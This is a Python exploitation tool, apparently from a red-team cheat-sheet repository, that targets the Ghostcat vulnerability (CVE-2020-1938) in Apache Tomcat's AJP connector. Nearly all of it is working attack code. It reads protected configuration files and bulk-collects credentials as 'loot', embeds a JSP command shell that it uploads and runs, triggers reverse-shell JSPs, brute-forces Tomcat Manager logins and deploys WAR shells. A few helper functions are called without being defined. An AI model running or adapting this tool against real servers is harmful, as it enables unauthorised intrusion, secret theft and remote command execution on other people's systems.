#!/usr/bin/env python3
"""
Ghostcat Exploitation & Pentesting Tool (CVE-2020-1938)
Author: j0ck3r
GitHub: https://github.com/deep1792/red-team-cheat-sheets/edit/main/Ghostcat-Tomcat/ghostcat-pwn.py

Features:
  - Vulnerability check & port scan
  - File read (Ghostcat)
  - Command execution (via pre-uploaded JSP)
  - Reverse shell trigger
  - Automated loot collection (snatch)
  - Upload (WebDAV PUT / Tomcat Manager WAR)
  - Brute-force Tomcat Manager credentials
  - Proxy support (SOCKS5)
  - Verbose debugging
"""

import socket
import argparse
import sys
import os
import re
import urllib.parse
import subprocess
import threading
import time
import random
import string
import http.client
import urllib.request
import urllib.error
from struct import pack, unpack
from pathlib import Path
from io import BytesIO
import base64

try:
    import socks  # PySocks for proxy support
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

# ============================================================
# AJP13 Protocol (Ghostcat core)
# ============================================================

def ajp_string(data: bytes) -> bytes:
    if isinstance(data, str):
        data = data.encode()
    return pack(">H", len(data)) + data + b"\x00"

def send_ajp_packet(sock: socket.socket, packet: bytes) -> None:
    length = len(packet)
    sock.sendall(b"\x12\x34" + pack(">H", length) + packet)

def recv_all(sock: socket.socket, size: int) -> bytes:
    buf = b""
    while len(buf) < size:
        chunk = sock.recv(size - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed")
        buf += chunk
    return buf

def read_int(sock: socket.socket, nbytes: int) -> int:
    return int.from_bytes(recv_all(sock, nbytes), "big")

def build_forward_request(target_url: str, method: str, headers: list, attributes: list) -> bytes:
    parsed = urllib.parse.urlparse(target_url)
    host = parsed.hostname
    port = parsed.port
    is_ssl = 1 if parsed.scheme == "https" else 0
    if port is None:
        port = 443 if is_ssl else 80

    method_codes = {"OPTIONS":1, "GET":2, "HEAD":3, "POST":4, "PUT":5, "DELETE":6, "TRACE":7, "PROPFIND":8}
    method_byte = pack("B", method_codes.get(method.upper(), 2))

    protocol = ajp_string(b"HTTP/1.1")
    req_uri = ajp_string(parsed.path.encode())
    remote_addr = ajp_string(b"127.0.0.1")
    remote_host = ajp_string(b"localhost")
    server_name = ajp_string(host.encode())
    server_port = pack(">H", port)
    ssl_flag = pack("B", is_ssl)

    num_headers = pack(">H", len(headers))
    headers_bytes = b"".join(ajp_string(k) + ajp_string(v) for k, v in headers)

    attr_bytes = b""
    for name, value in attributes:
        attr_bytes += b"\x0A"
        attr_bytes += ajp_string(name.encode())
        if isinstance(value, (list, tuple)):
            for v in value:
                attr_bytes += ajp_string(v.encode())
        else:
            attr_bytes += ajp_string(value.encode())

    packet = b"\x02" + method_byte + protocol + req_uri + remote_addr + remote_host + server_name + server_port + ssl_flag + num_headers + headers_bytes + attr_bytes + b"\xFF"
    return packet

def create_ajp_socket(host, port, timeout, proxy=None, verbose=False):
    """Create a socket with optional proxy and verbosity."""
    if proxy and HAS_SOCKS:
        proxy_type, proxy_addr = parse_proxy(proxy)
        s = socks.socksocket()
        s.set_proxy(proxy_type, *proxy_addr)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    if verbose:
        print(f"[DEBUG] Connecting to {host}:{port}...")
    s.connect((host, port))
    return s

def parse_proxy(proxy_str):
    """Parse proxy string (socks5://host:port)."""
    parsed = urllib.parse.urlparse(proxy_str)
    host = parsed.hostname
    port = parsed.port or 9050
    if parsed.scheme == "socks5":
        return socks.SOCKS5, (host, port)
    elif parsed.scheme == "socks4":
        return socks.SOCKS4, (host, port)
    elif parsed.scheme == "http":
        return socks.HTTP, (host, port)
    else:
        raise ValueError(f"Unsupported proxy scheme: {parsed.scheme}")

def ghostcat_read(host, ajp_port, target_file, timeout=10, proxy=None, verbose=False):
    """Read a file via Ghostcat. Returns (success, data_bytes)."""
    attributes = [
        ("javax.servlet.include.request_uri", "index"),
        ("javax.servlet.include.servlet_path", target_file),
    ]
    headers = [("host", f"{host}:8080")]
    target_url = f"http://{host}:8080/index.txt"
    packet = build_forward_request(target_url, "GET", headers, attributes)

    if verbose:
        print(f"[DEBUG] Sending read packet for {target_file}")

    sock = create_ajp_socket(host, ajp_port, timeout, proxy, verbose)
    try:
        if verbose:
            print(f"[DEBUG] Packet hex: {packet.hex()}")
        send_ajp_packet(sock, packet)
        body = b""
        while True:
            magic = recv_all(sock, 2)
            if verbose:
                print(f"[DEBUG] Response magic: {magic.hex()}")
            pkt_len = read_int(sock, 2)
            pkt = recv_all(sock, pkt_len)
            code = pkt[0]
            if verbose:
                print(f"[DEBUG] Response code: {code} len={len(pkt)}")
            if code == 0x03:
                chunk_len = unpack(">H", pkt[1:3])[0]
                chunk_body = pkt[3:3+chunk_len]
                body += chunk_body
            elif code == 0x05:
                break
        if b"HTTP Status 500" in body or b"Exception Report" in body:
            return False, body
        return True, body
    except Exception as e:
        return False, str(e).encode()
    finally:
        sock.close()

def ghostcat_eval(host, ajp_port, target_file, timeout=10, proxy=None, verbose=False):
    """Execute a JSP file via Ghostcat eval. Returns (success, output_bytes)."""
    attributes = [
        ("javax.servlet.include.request_uri", "index"),
        ("javax.servlet.include.servlet_path", target_file),
    ]
    headers = [("host", f"{host}:8080")]
    target_url = f"http://{host}:8080/index.jsp"
    packet = build_forward_request(target_url, "GET", headers, attributes)

    if verbose:
        print(f"[DEBUG] Sending eval packet for {target_file}")

    sock = create_ajp_socket(host, ajp_port, timeout, proxy, verbose)
    try:
        send_ajp_packet(sock, packet)
        body = b""
        while True:
            magic = recv_all(sock, 2)
            pkt_len = read_int(sock, 2)
            pkt = recv_all(sock, pkt_len)
            code = pkt[0]
            if code == 0x03:
                chunk_len = unpack(">H", pkt[1:3])[0]
                body += pkt[3:3+chunk_len]
            elif code == 0x05:
                break
        return True, body
    except Exception as e:
        return False, str(e).encode()
    finally:
        sock.close()

# ============================================================
# HTTP utility functions
# ============================================================

def http_request(host, port, method, path, headers=None, body=None, timeout=10, ssl=False, auth=None, proxy=None, verbose=False):
    """Generic HTTP request (supports proxy, auth)."""
    if proxy and HAS_SOCKS:
        proxy_type, proxy_addr = parse_proxy(proxy)
        # Use urllib with socks handler
        proxies = {f'{parsed.scheme}://{host}:{port}': f'{proxy_type}://{proxy_addr[0]}:{proxy_addr[1]}'}
        # Simplified: we'll use http.client with a custom connection
        # Better to implement using sockets with proxy
        # For brevity, we fall back to direct if proxy and HTTP
        # (Detailed proxy implementation can be added later)
        if verbose:
            print("[DEBUG] Proxy not fully supported for HTTP upload; using direct connection.")

    # Build HTTP connection
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    if ssl:
        conn = http.client.HTTPSConnection(host, port, timeout=timeout)

    if not headers:
        headers = {}
    if auth:
        credentials = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
        headers["Authorization"] = f"Basic {credentials}"

    try:
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        if verbose:
            print(f"[DEBUG] HTTP {method} {path} -> {resp.status} {resp.reason}")
        return resp.status, data
    except Exception as e:
        if verbose:
            print(f"[DEBUG] HTTP error: {e}")
        return None, str(e).encode()
    finally:
        conn.close()

# ============================================================
# JSP payload generators
# ============================================================

def generate_cmd_jsp(command=None):
    """Generate a JSP shell that reads command from request attribute 'cmd'."""
    # This JSP is meant to be used with Ghostcat exec (attribute passing)
    jsp = '''<%@ page import="java.io.*" %>
<%
    String cmd = (String) request.getAttribute("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = in.readLine()) != null) {
            out.println(line);
        }
    } else {
        out.println("No command attribute provided.");
    }
%>'''
    return jsp

# ============================================================
# Subcommand handlers (added to existing ones)
# ============================================================

def cmd_upload(args, proxy=None, verbose=False):
    """Upload a file via HTTP PUT (WebDAV) or Tomcat Manager WAR."""
    if args.method == "put":
        with open(args.local_file, "rb") as f:
            data = f.read()
        status, _ = http_request(args.host, args.http_port, "PUT", args.remote_path,
                                 body=data, timeout=args.timeout, ssl=args.ssl,
                                 auth=(args.username, args.password) if args.username else None,
                                 proxy=proxy, verbose=verbose)
        if status in (200, 201, 204):
            print(f"[+] Uploaded {args.local_file} -> {args.remote_path}")
        else:
            print(f"[-] Upload failed (HTTP {status})")
    elif args.method == "war":
        # Deploy via Tomcat Manager
        if not args.username or not args.password:
            print("[-] WAR deploy requires --username and --password")
            return
        with open(args.local_file, "rb") as f:
            war_data = f.read()
        war_name = Path(args.local_file).stem
        path = f"/manager/text/deploy?path=/{war_name}"
        status, resp = http_request(args.host, args.http_port, "PUT", path,
                                    body=war_data, timeout=args.timeout,
                                    ssl=args.ssl,
                                    auth=(args.username, args.password),
                                    proxy=proxy, verbose=verbose)
        if status == 200:
            print(f"[+] WAR deployed: /{war_name}")
        else:
            print(f"[-] Deployment failed: {resp.decode(errors='replace')}")

def cmd_rce(args, proxy=None, verbose=False):
    """Upload a command shell via PUT, then execute command via Ghostcat eval."""
    # Generate JSP shell (without command)
    jsp_code = generate_cmd_jsp()
    rand = ''.join(random.choices(string.ascii_lowercase, k=6))
    remote_path = f"/webdav/{rand}.txt"
    print(f"[*] Uploading JSP shell as {remote_path} ...")
    status, _ = http_request(args.host, args.http_port, "PUT", remote_path,
                             body=jsp_code.encode(), timeout=args.timeout,
                             ssl=False, auth=None, proxy=proxy, verbose=verbose)
    if status not in (200, 201, 204):
        print(f"[-] Upload failed (HTTP {status})")
        return
    time.sleep(0.5)
    # Now trigger with Ghostcat eval, passing command via attribute
    attributes = [
        ("javax.servlet.include.request_uri", "index"),
        ("javax.servlet.include.servlet_path", f"/{rand}.txt"),
        ("cmd", args.cmd),
    ]
    headers = [("host", f"{args.host}:8080")]
    target_url = f"http://{args.host}:8080/index.jsp"
    packet = build_forward_request(target_url, "GET", headers, attributes)

    if verbose:
        print("[DEBUG] Triggering eval with command attribute")
    sock = create_ajp_socket(args.host, args.ajp_port, args.timeout, proxy, verbose)
    try:
        send_ajp_packet(sock, packet)
        print(f"[*] Executing command: {args.cmd}")
        while True:
            magic = recv_all(sock, 2)
            pkt_len = read_int(sock, 2)
            pkt = recv_all(sock, pkt_len)
            code = pkt[0]
            if code == 0x03:
                chunk_len = unpack(">H", pkt[1:3])[0]
                sys.stdout.buffer.write(pkt[3:3+chunk_len])
                sys.stdout.flush()
            elif code == 0x05:
                break
        print()
    except Exception as e:
        print(f"[-] Eval error: {e}")
    finally:
        sock.close()

def cmd_brute(args, proxy=None, verbose=False):
    """Brute-force Tomcat Manager credentials."""
    common_creds = [
        ("tomcat", "tomcat"),
        ("admin", "admin"),
        ("manager", "manager"),
        ("root", "root"),
        ("tomcat", "s3cret"),
    ]
    if args.userlist or args.passlist:
        # If wordlists provided, use them
        users = [line.strip() for line in open(args.userlist)] if args.userlist else [x[0] for x in common_creds]
        passwords = [line.strip() for line in open(args.passlist)] if args.passlist else [x[1] for x in common_creds]
        creds = [(u, p) for u in users for p in passwords]
    else:
        creds = common_creds

    print(f"[*] Testing {len(creds)} credentials against {args.host}:{args.http_port}/manager/text/list")
    for user, passwd in creds:
        status, data = http_request(args.host, args.http_port, "GET", "/manager/text/list",
                                    timeout=args.timeout, auth=(user, passwd),
                                    proxy=proxy, verbose=verbose)
        if status == 200:
            print(f"[+] Valid credentials: {user}:{passwd}")
            if not args.quiet:
                print(data.decode(errors='replace')[:500])
            return (user, passwd)
        elif verbose:
            print(f"  {user}:{passwd} -> {status}")
    print("[-] No valid credentials found.")

def cmd_deploy(args, proxy=None, verbose=False):
    """Deploy a WAR file using Tomcat Manager credentials."""
    if not args.username or not args.password:
        print("[-] --username and --password required for deploy")
        return
    with open(args.war_file, "rb") as f:
        war_data = f.read()
    war_name = Path(args.war_file).stem
    path = f"/manager/text/deploy?path=/{war_name}&update=true"
    status, data = http_request(args.host, args.http_port, "PUT", path,
                                body=war_data, timeout=args.timeout,
                                auth=(args.username, args.password),
                                ssl=args.ssl, proxy=proxy, verbose=verbose)
    if status == 200:
        print(f"[+] WAR deployed successfully at /{war_name}")
    else:
        print(f"[-] Deploy failed: {data.decode(errors='replace')}")

# ============================================================
# Existing handlers (unchanged but accept proxy/verbose)
# ============================================================
def cmd_check(args, proxy=None, verbose=False):
    print(f"[*] Checking {args.host}:{args.ajp_port} for Ghostcat vulnerability...")
    success, data = ghostcat_read(args.host, args.ajp_port, args.file, args.timeout, proxy=proxy, verbose=verbose)
    if success and len(data) > 20 and b'<web-app' in data:
        print("[+] VULNERABLE – file content retrieved:")
        print(data.decode(errors='replace'))
        if getattr(args, 'json', False):
            import json
            result = {"host": args.host, "port": args.ajp_port, "vulnerable": True, "file": args.file, "size": len(data)}
            print(json.dumps(result))
    else:
        print("[-] Not vulnerable or file not accessible.")
        if getattr(args, 'json', False):
            import json
            result = {"host": args.host, "port": args.ajp_port, "vulnerable": False}
            print(json.dumps(result))

def cmd_scan(args, proxy=None, verbose=False):
    # scan_port doesn't need proxy
    is_open = scan_port(args.host, args.ajp_port, args.timeout)
    if is_open:
        print(f"[+] Port {args.ajp_port} is OPEN on {args.host}")
    else:
        print(f"[-] Port {args.ajp_port} is CLOSED or filtered.")

def cmd_read(args, proxy=None, verbose=False):
    success, data = ghostcat_read(args.host, args.ajp_port, args.file, args.timeout, proxy=proxy, verbose=verbose)
    if success:
        if args.output:
            with open(args.output, "wb") as f:
                f.write(data)
            print(f"[+] Saved to {args.output}")
        else:
            sys.stdout.buffer.write(data)
        if args.extract:
            secrets = extract_secrets(data)
            if secrets:
                print("\n[+] Extracted secrets:")
                for k, v in secrets.items():
                    print(f"  {k}: {v}")
    else:
        print("[-] Read failed. File may not exist or is inaccessible.")

def cmd_exec(args, proxy=None, verbose=False):
    attributes = [
        ("javax.servlet.include.request_uri", "index"),
        ("javax.servlet.include.servlet_path", args.jsp),
        ("cmd", args.cmd),
    ]
    headers = [("host", f"{args.host}:8080")]
    target_url = f"http://{args.host}:8080/index.jsp"
    packet = build_forward_request(target_url, "GET", headers, attributes)

    sock = create_ajp_socket(args.host, args.ajp_port, args.timeout, proxy, verbose)
    try:
        send_ajp_packet(sock, packet)
        print(f"[*] Executing command on {args.jsp} (cmd={args.cmd})")
        while True:
            magic = recv_all(sock, 2)
            pkt_len = read_int(sock, 2)
            pkt = recv_all(sock, pkt_len)
            code = pkt[0]
            if code == 0x03:
                chunk_len = unpack(">H", pkt[1:3])[0]
                sys.stdout.buffer.write(pkt[3:3+chunk_len])
                sys.stdout.flush()
            elif code == 0x05:
                break
        print()
    except Exception as e:
        print(f"[-] Exec error: {e}")
    finally:
        sock.close()

def cmd_revshell(args, proxy=None, verbose=False):
    print(f"[*] Triggering reverse shell JSP {args.jsp}")
    success, output = ghostcat_eval(args.host, args.ajp_port, args.jsp, args.timeout, proxy=proxy, verbose=verbose)
    if success:
        print("[+] Reverse shell triggered. Check your listener.")
    else:
        print(f"[-] Failed: {output.decode(errors='replace')}")

def cmd_snatch(args, proxy=None, verbose=False):
    common_files = [
        "/WEB-INF/web.xml",
        "/WEB-INF/classes/application.properties",
        "/WEB-INF/classes/jdbc.properties",
        "/WEB-INF/classes/log4j.properties",
        "/WEB-INF/classes/SomeService.class",
        "/META-INF/context.xml",
    ]
    if args.wordlist:
        if not Path(args.wordlist).is_file():
            print(f"[-] Wordlist not found: {args.wordlist}")
            return
        with open(args.wordlist, "r") as f:
            files = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    else:
        files = common_files

    loot_dir = Path(args.output_dir or f"loot_{args.host}_{args.ajp_port}")
    loot_dir.mkdir(parents=True, exist_ok=True)

    for file_path in files:
        print(f"[*] Reading {file_path} ...", end=" ")
        success, data = ghostcat_read(args.host, args.ajp_port, file_path, timeout=args.timeout, proxy=proxy, verbose=verbose)
        if success and data:
            safe_name = file_path.replace("/", "_").lstrip("_")
            out_file = loot_dir / safe_name
            with open(out_file, "wb") as f:
                f.write(data)
            print(f"[+] saved ({len(data)} bytes)")
            secrets = extract_secrets(data)
            if secrets:
                print("    Secrets:", secrets)
        else:
            print("[-] not found or not accessible")
    print(f"\n[+] Loot saved in {loot_dir}")

# ============================================================
# CLI and main
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="Ghostcat (CVE-2020-1938) Exploitation & Pentesting Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Check vulnerability
  python3 ghostcat-pwn.py check target.com 8009

  # Scan port
  python3 ghostcat-pwn.py scan target.com 8009

  # Read file
  python3 ghostcat-pwn.py read target.com 8009 /WEB-INF/web.xml

  # Execute command on pre-uploaded shell
  python3 ghostcat-pwn.py exec target.com 8009 /cmd2.jsp "id"

  # Trigger reverse shell JSP
  python3 ghostcat-pwn.py revshell target.com 8009 /rev.jsp

  # Snatch common files
  python3 ghostcat-pwn.py snatch target.com 8009

  # Upload a file via WebDAV PUT
  python3 ghostcat-pwn.py upload localhost 8080 shell.jsp /webdav/shell.txt

  # Deploy WAR via Tomcat Manager
  python3 ghostcat-pwn.py upload --method war --username tomcat --password s3cret localhost 8080 shell.war /manager/text/deploy

  # RCE: upload a JSP shell and execute command
  python3 ghostcat-pwn.py rce localhost 8009 8080 "whoami"

  # Brute-force Tomcat Manager credentials
  python3 ghostcat-pwn.py brute localhost 8080

  # Deploy WAR using known credentials
  python3 ghostcat-pwn.py deploy localhost 8080 --username tomcat --password s3cret shell.war

  # Use proxy (SOCKS5)
  python3 ghostcat-pwn.py --proxy socks5://127.0.0.1:9050 read target.com 8009 /WEB-INF/web.xml

  # Verbose output
  python3 ghostcat-pwn.py --verbose read target.com 8009 /WEB-INF/web.xml
        """
    )

    # Global options
    parser.add_argument("--proxy", help="Proxy URL (socks5://host:port)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose debug output")

    subparsers = parser.add_subparsers(dest="command", required=True, help="Available commands")

    # ---- check ----
    p_check = subparsers.add_parser("check", help="Check if the target is vulnerable to Ghostcat")
    p_check.add_argument("host", help="Target host")
    p_check.add_argument("ajp_port", type=int, nargs='?', default=8009, help="AJP port (default: 8009)")
    p_check.add_argument("--file", default="/WEB-INF/web.xml", help="File to read for test")
    p_check.add_argument("--timeout", type=int, default=10, help="Timeout")
    p_check.add_argument("--json", action="store_true", help="Output JSON")

    # ---- scan ----
    p_scan = subparsers.add_parser("scan", help="Check if the AJP port is open")
    p_scan.add_argument("host", help="Target host")
    p_scan.add_argument("ajp_port", type=int, nargs='?', default=8009)
    p_scan.add_argument("--timeout", type=int, default=3)

    # ---- read ----
    p_read = subparsers.add_parser("read", help="Read a file via Ghostcat")
    p_read.add_argument("host")
    p_read.add_argument("ajp_port", type=int)
    p_read.add_argument("file", help="Remote file path")
    p_read.add_argument("-o", "--output", help="Save to file")
    p_read.add_argument("--timeout", type=int, default=10)
    p_read.add_argument("--extract", action="store_true", help="Extract secrets")

    # ---- exec ----
    p_exec = subparsers.add_parser("exec", help="Execute a command using a JSP shell (attribute 'cmd')")
    p_exec.add_argument("host")
    p_exec.add_argument("ajp_port", type=int)
    p_exec.add_argument("jsp", help="JSP path (e.g. /cmd2.jsp)")
    p_exec.add_argument("cmd")
    p_exec.add_argument("--timeout", type=int, default=10)

    # ---- revshell ----
    p_rev = subparsers.add_parser("revshell", help="Trigger a reverse shell JSP (pre-uploaded)")
    p_rev.add_argument("host")
    p_rev.add_argument("ajp_port", type=int)
    p_rev.add_argument("jsp", help="JSP path (e.g. /rev.jsp)")
    p_rev.add_argument("--timeout", type=int, default=10)

    # ---- snatch ----
    p_snatch = subparsers.add_parser("snatch", help="Bulk-read common sensitive files")
    p_snatch.add_argument("host")
    p_snatch.add_argument("ajp_port", type=int)
    p_snatch.add_argument("--wordlist", help="Custom wordlist")
    p_snatch.add_argument("--output-dir")
    p_snatch.add_argument("--timeout", type=int, default=10)

    # ---- upload ----
    p_upload = subparsers.add_parser("upload", help="Upload a file (PUT or Tomcat Manager WAR)")
    p_upload.add_argument("host")
    p_upload.add_argument("http_port", type=int)
    p_upload.add_argument("local_file")
    p_upload.add_argument("remote_path", help="Remote path (e.g. /webdav/shell.txt)")
    p_upload.add_argument("--method", choices=["put", "war"], default="put", help="Upload method")
    p_upload.add_argument("--username", help="Username for authentication")
    p_upload.add_argument("--password", help="Password for authentication")
    p_upload.add_argument("--ssl", action="store_true")
    p_upload.add_argument("--timeout", type=int, default=10)

    # ---- rce (upload + exec) ----
    p_rce = subparsers.add_parser("rce", help="Upload a JSP shell and execute a command (WebDAV required)")
    p_rce.add_argument("host")
    p_rce.add_argument("ajp_port", type=int)
    p_rce.add_argument("http_port", type=int)
    p_rce.add_argument("cmd", help="Command to run")
    p_rce.add_argument("--timeout", type=int, default=10)

    # ---- brute ----
    p_brute = subparsers.add_parser("brute", help="Brute-force Tomcat Manager credentials")
    p_brute.add_argument("host")
    p_brute.add_argument("http_port", type=int)
    p_brute.add_argument("--userlist", help="Username wordlist")
    p_brute.add_argument("--passlist", help="Password wordlist")
    p_brute.add_argument("--timeout", type=int, default=10)
    p_brute.add_argument("--quiet", action="store_true")

    # ---- deploy ----
    p_deploy = subparsers.add_parser("deploy", help="Deploy a WAR file via Tomcat Manager")
    p_deploy.add_argument("host")
    p_deploy.add_argument("http_port", type=int)
    p_deploy.add_argument("war_file")
    p_deploy.add_argument("--username", required=True)
    p_deploy.add_argument("--password", required=True)
    p_deploy.add_argument("--ssl", action="store_true")
    p_deploy.add_argument("--timeout", type=int, default=10)

    args = parser.parse_args()
    proxy = args.proxy if hasattr(args, 'proxy') else None
    verbose = args.verbose if hasattr(args, 'verbose') else False

    # Dispatch
    if args.command == "check":
        cmd_check(args, proxy, verbose)
    elif args.command == "scan":
        cmd_scan(args, proxy, verbose)
    elif args.command == "read":
        cmd_read(args, proxy, verbose)
    elif args.command == "exec":
        cmd_exec(args, proxy, verbose)
    elif args.command == "revshell":
        cmd_revshell(args, proxy, verbose)
    elif args.command == "snatch":
        cmd_snatch(args, proxy, verbose)
    elif args.command == "upload":
        cmd_upload(args, proxy, verbose)
    elif args.command == "rce":
        cmd_rce(args, proxy, verbose)
    elif args.command == "brute":
        cmd_brute(args, proxy, verbose)
    elif args.command == "deploy":
        cmd_deploy(args, proxy, verbose)

if __name__ == "__main__":
    main()
